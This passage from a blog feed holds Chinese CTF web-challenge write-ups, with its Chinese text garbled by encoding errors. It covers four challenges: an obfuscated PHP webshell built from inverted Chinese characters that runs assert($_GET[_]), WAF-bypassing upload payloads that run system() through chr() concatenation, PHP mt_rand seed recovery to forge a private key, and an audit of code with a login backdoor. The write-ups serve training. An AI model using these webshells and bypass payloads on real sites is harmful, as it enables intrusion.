id="ç¥å¥‡rce">ç¥å¥‡rce</span></h4><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ±‰å­—å–åè·å¾—å…ƒç´ è¿›è¡Œæ‹¼æ¥</p><p><img src="/images/SUCTF-2018-GetShell/image-20210831210435406.png" alt="image-20210831210435406"></p><p>åˆ©ç”¨è·å¾—çš„å­—å…¸æ‹¼æ¥shell</p><img src="/images/SUCTF-2018-GetShell/image-20210831210444208.png" alt="image-20210831210444208" style="zoom:80%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=[];$_=($__==$__);</span><br><span class="line">$__=~(æ•);$___.=$__[$_];$__=~(æŒ‘);$___.=$__[$_];$__=~(æŒ‘);$___.=$__[$_];$__=~(çš„);$___.=$__[$_];$__=~(è£);$___.=$__[$_];$__=~(è‹¦);$___.=$__[$_];</span><br><span class="line">$__=~(æ ·);$____.=$__[$_];$__=~(ä¸€);$____.=$__[$_];$__=~(åº§);$____.=$__[$_];$__=~(ç«™);$____.=$__[$_];</span><br><span class="line">$_=$$____;$___($_[_]);</span><br><span class="line"><span class="comment">//assert($_GET[_])</span></span><br></pre></td></tr></table></figure><p>ç»“åˆèšå‰‘ï¼Œè¯»environè·å–flag</p><img src="/images/SUCTF-2018-GetShell/image-20210831210651989.png" alt="image-20210831210651989" style="zoom:80%;"><p>å‚è€ƒæ–‡ç« :<br><a href="https://mochu.blog.csdn.net/article/details/107729445">å‚è€ƒé“¾æ¥</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">æµ…è°ˆPHPä»£ç æ‰§è¡Œä¸­å‡ºç°è¿‡æ»¤é™åˆ¶çš„ç»•è¿‡æ‰§è¡Œæ–¹æ³•</a></p><div class="toc" tabindex="1"><!-- toc --><!-- tocstop --></div><br>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;ç¥å¥‡çš„ç»•è¿‡rce&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>çº¢æ˜è°·CTF-2021-write_shell</title>
    <link href="http://example.com/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/"/>
    <id>http://example.com/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/</id>
    <published>2021-08-31T03:42:12.897Z</published>
    <updated>2021-08-31T03:47:06.549Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>trike</p><a id="more"></a></blockquote><h4><span id="æºç ">æºç </span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,$input))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array($input))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>($input <span class="keyword">as</span> $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&#x27;sandbox/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>($_GET[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> $dir;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        $data = $_GET[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ‰è¿‡æ»¤ï¼Œé’ˆå¯¹æ•°ç»„æ£€æŸ¥ï¼Œä½†å¹¸å¥½ä¸ç®—ä¸¥â€¦â€¦</p><p>çŸ­æ ‡ç­¾+æ‹¼æ¥</p><h4><span id="flag">flag</span></h4><p><code>?action=upload&amp;data=&lt;?=system(chr(108).chr(115).chr(32).chr(47))?&gt;</code></p><p><img src="/images/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/image-20210831114540157.png" alt="image-20210831114540157"></p><p>cat</p><p><code>?action=upload&amp;data=&lt;?=system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(108).chr(108).chr(108).chr(108).chr(108).chr(108).chr(49).chr(49).chr(49).chr(50).chr(50).chr(50).chr(50).chr(50).chr(50).chr(50).chr(108).chr(97).chr(103))?&gt;</code></p><p><img src="/images/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/image-20210831114641896.png" alt="image-20210831114641896"></p><div class="toc" tabindex="1"><!-- toc --><!-- tocstop --></div><br>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;trike&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020-Ezaudit</title>
    <link href="http://example.com/2021/08/28/MRCTF2020-Ezaudit/"/>
    <id>http://example.com/2021/08/28/MRCTF2020-Ezaudit/</id>
    <published>2021-08-28T02:53:12.240Z</published>
    <updated>2021-08-29T11:30:16.755Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>æ–‡ä»¶æ³„éœ²ã€ä¼ªéšæœºæ•°</p><a id="more"></a></blockquote><p>æ‰«ç›®å½•ï¼š</p><img src="/images/MRCTF2020-Ezaudit/image-20210828105532039.png" alt="image-20210828105532039" style="zoom:80%;"><p>æ–‡ä»¶æ³„éœ²ä¸€ä¸ªindex.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p><strong>$Public_key = KVQP0LdJKRaV3n9D  how to get crisprâ€™s private_key???</strong></p><p>é€šè¿‡ç»™å‡ºçš„ä¸€æ®µå­—ç¬¦ï¼Œæ±‚æ­¤æ¬¡ç”Ÿæˆéšæœºæ•°çš„ç§å­</p><p>å…ˆè½¬åŒ–ä¸ºphp_seed è¦æ±‚çš„æ ¼å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">str1 =<span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] == str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><img src="/images/MRCTF2020-Ezaudit/image-20210828110051232.png" alt="image-20210828110051232"></p><p>è·å–privatekey</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="comment">//XuNhoueCDCGc</span></span><br></pre></td></tr></table></figure><p>è™½è¯´æ˜¯index.phpï¼Œä½†ç™»å½•ç•Œé¢åœ¨login.html</p><img src="/images/MRCTF2020-Ezaudit/image-20210828110240781.png" alt="image-20210828110240781" style="zoom:80%;"><p>okâ€¦â€¦</p><p>å‚è€ƒæ–‡ç« :<br><a href="https://www.freebuf.com/column/205240.html">CTF| webç¯‡ä¹‹ä¼ªéšæœºæ•°</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;æ–‡ä»¶æ³„éœ²ã€ä¼ªéšæœºæ•°&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020-Easyphp</title>
    <link href="http://example.com/2021/08/27/GYCTF2020-Easyphp/"/>
    <id>http://example.com/2021/08/27/GYCTF2020-Easyphp/</id>
    <published>2021-08-27T10:24:16.381Z</published>
    <updated>2021-08-27T16:15:31.701Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>æ–‡ä»¶æ³„éœ²ã€ä»£ç å®¡è®¡ã€ååºåˆ—åŒ–</p><a id="more"></a></blockquote><blockquote><p>åŠæˆå“ç³»ç»Ÿ ç•™åé—¨çš„ç¨‹åºå‘˜å·²ç»è·‘è·¯</p></blockquote><p>ä¸€ä¸ªç”¨æˆ·ç™»å½•æ¡†ï¼Œæœ‰æ•æ„Ÿè¯è¿‡æ»¤ï¼Œæµ‹è¯•ä¸åƒæ˜¯sqlæ³¨å…¥</p><p>å­—å…¸æ‰«æï¼š</p><p><img src="/images/GYCTF2020-Easyphp/image-20210827210220812.png" alt="image-20210827210220812"></p><p>å‘ç°æ–‡ä»¶æ³„éœ²</p><h4><span id="ä»£ç å®¡è®¡">ä»£ç å®¡è®¡</span></h4><img src="/images/GYCTF2020-Easyphp/image-20210827210234798.png" alt="image-20210827210234798" style="zoom:80%;"><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªè·å–flagçš„æ–¹æ³•ï¼Œç™»å½•å°±è¡Œï¼›fuzzçš„æ—¶å€™å‘ç°äº†<code>admin</code>è´¦æˆ·æ˜¯å­˜åœ¨çš„</p><p>lib ç±»åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class User ç”¨æˆ·æ“ä½œ</span><br><span class="line">class Info ç”¨æˆ·ä¿¡æ¯</span><br><span class="line">Class UpdateHelper ä¿¡æ¯æ›´æ–°å¸®åŠ©ç±» &#x2F;&#x2F;ä¼¼ä¹æ²¡å®Œå–„</span><br><span class="line">class dbCtrl æ•°æ®æ“ä½œç±»</span><br></pre></td></tr></table></figure><p>ç™»å½•é€»è¾‘ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class User   </span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();<span class="comment">//æ•°æ®æ“ä½œ</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;<span class="comment">//ç”¨æˆ·id</span></span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;<span class="comment">//è®°å½•ç™»å½•çŠ¶æ€</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ çš„IDæ˜¯&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ å¥½ï¼&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <strong>$mysqli=new dbCtrl();</strong></p><p>æ•°æ®å±‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class dbCtrl</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123; <span class="comment">//sessionä¸­çš„tokenå¯ä»¥ç†è§£ä¸ºä»¤ç‰Œï¼Œè®°å½•è´¦æˆ·æƒé™ï¼Œadminæƒé™åˆ™ç›´æ¥è¿‡ï¼Œä¹Ÿå°±æ˜¯åé—¨ï¼Ÿ</span></span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123; <span class="comment">//ç»“æœé›†ä¸ºç©ºï¼Œåˆ™ç”¨æˆ·ä¸å­˜åœ¨</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;<span class="comment">//å¯†ç é”™è¯¯åˆ™ç™»å½•å¤±è´¥</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;å¯†ç é”™è¯¯ï¼&#x27;</span>);</span><br><span class="line">            